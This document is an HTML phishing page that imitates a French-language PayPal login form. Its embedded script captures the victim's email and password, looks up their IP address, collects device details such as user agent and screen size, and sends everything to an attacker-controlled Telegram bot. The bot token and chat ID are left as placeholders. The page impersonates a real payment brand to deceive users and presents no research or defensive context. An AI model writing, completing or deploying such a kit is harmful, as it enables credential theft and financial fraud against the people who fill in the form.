<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log into your PayPal account</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .login-card { background-color: #fff; border: 1px solid #e3e3e3; border-radius: 8px; padding: 40px 40px 60px 40px; width: 100%; max-width: 480px; text-align: center; }
        h1 { font-size: 42px; font-weight: 800; margin-bottom: 45px; color: #000; letter-spacing: -0.5px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 19px 15px; margin-bottom: 16px; border: 1px solid #adadad; border-radius: 4px; font-size: 16px; color: #333; outline: none; background-color: #fff; }
        input::placeholder { color: #6e6e6e; font-weight: 400; }
        input:focus { border-color: #0056b3; border-width: 1px; }
        .forgot-password { display: block; text-align: left; color: #0055dd; text-decoration: none; font-size: 15px; font-weight: 600; margin-bottom: 25px; margin-top: 5px; }
        .forgot-password:hover { text-decoration: underline; }
        .btn-login { width: 100%; padding: 16px; background-color: #004aad; color: white; border: none; border-radius: 50px; font-size: 17px; font-weight: 600; cursor: pointer; margin-bottom: 10px; }
        .btn-login:hover { background-color: #003a8c; }
        .separator { display: flex; align-items: center; text-align: center; color: #666; margin: 30px 0; font-size: 15px; }
        .separator::before, .separator::after { content: ''; flex: 1; border-bottom: 1px solid #dadada; }
        .separator::before { margin-right: 15px; }
        .separator::after { margin-left: 15px; }
        .btn-register { width: 100%; padding: 15px; background-color: white; color: black; border: 2px solid #000; border-radius: 50px; font-size: 17px; font-weight: 700; cursor: pointer; }
        .btn-register:hover { background-color: #f7f7f7; }
        .footer-lang { margin-top: 60px; display: flex; justify-content: center; align-items: center; font-size: 14px; color: #555; }
        .flag-icon { width: 20px; height: 14px; background: linear-gradient(90deg, #00267F 33%, #FFFFFF 33%, #FFFFFF 66%, #F31830 66%); display: inline-block; margin-right: 10px; box-shadow: 0 0 1px rgba(0,0,0,0.2); }
        .arrow-down { border: solid #666; border-width: 0 1.5px 1.5px 0; display: inline-block; padding: 3px; transform: rotate(45deg); margin-right: 12px; margin-bottom: 2px; }
        .lang-text { font-weight: 700; color: #444; }
        .lang-text span { color: #888; font-weight: 400; margin-left: 5px; }
    </style>
</head>
<body>

    <div class="login-card">
        <h1>PayPal</h1>
        
        <form id="login-form">
            <input type="text" id="email" placeholder="Email ou numéro de mobile" required>
            <input type="password" id="password" placeholder="Mot de passe" required>
            
            <a href="#" class="forgot-password">Mot de passe oublié ?</a>
            
            <button type="submit" class="btn-login">Connexion</button>
        </form>

        <div class="separator">ou</div>

        <button class="btn-register">Ouvrir un compte</button>

        <div class="footer-lang">
            <div class="flag-icon"></div>
            <div class="arrow-down"></div>
            <div class="lang-text">Français <span>| English</span></div>
        </div>
    </div>

<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
<script>
    const TOKEN = "توكن";   
    const CHAT_ID = "معرف الدردشة"; 
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        

    document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        axios.get('https://api.ipify.org?format=json')
            .then(response => {
                const ip = response.data.ip;
                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

                const message = ` 
<b>New Login Attempt</b>\n
<b>Email:</b> ${email}\n
<b>Password:</b> ${password}\n
<b>IP Address:</b> ${ip}\n
<b>Device Type:</b> ${deviceType}\n
<b>Platform:</b> ${platform}\n
<b>User Agent:</b> ${userAgent}\n
<b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
                `;

                axios.post(URI_API, {
                    chat_id: CHAT_ID,
                    parse_mode: 'html',
                    text: message
                }).then(() => {
                    alert('Information sent successfully!');
                }).catch(() => {
                    alert('Error sending the information. Please try again.');
                });
            })
            .catch(() => {
                alert('Error fetching the IP address. Please try again.');
            });
    });
</script>
</body>
</html>
